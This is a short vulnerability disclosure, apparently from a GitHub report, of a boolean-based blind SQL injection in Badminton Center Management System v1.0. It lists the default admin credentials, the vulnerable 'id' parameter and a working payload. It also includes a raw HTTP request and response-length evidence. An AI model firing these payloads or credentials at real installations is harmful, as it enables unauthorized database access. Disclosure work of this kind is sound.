# Badminton Center Management System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15318/badminton-center-management-system-phpoop-free-source-code.html

Current database name: bcms_db,length is 7

Vulnerability File: /bcms/admin/?page=sales/manage_sale&id=

Vulnerability location: /bcms/admin/?page=sales/manage_sale&id=, id

[+] Payload: /bcms/admin/?page=sales/manage_sale&id=6%27%20and%20length(database())%20=7--+ // Leak place ---> id


```sql
GET /bcms/admin/?page=sales/manage_sale&id=6%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=qq2e8htekg3g2rkgtbq38p0jnv
Connection: close
```

When length (database ()) = 6, Content-Length: 33357
![image](https://user-images.githubusercontent.com/54017627/170617795-4fbdfe5f-3f76-4ff9-a90d-920785eab209.png)

![image](https://user-images.githubusercontent.com/54017627/170617844-bcc09f78-c829-424a-a9f4-97dbdd3c6f73.png)

When length (database ()) = 7, Content-Length: 35013
![image](https://user-images.githubusercontent.com/54017627/170617749-f16fc021-56fb-4bae-a2ec-fc659f9c78e9.png)

![image](https://user-images.githubusercontent.com/54017627/170617816-aee9d36a-832a-4ea1-aa45-374fee566cc0.png)
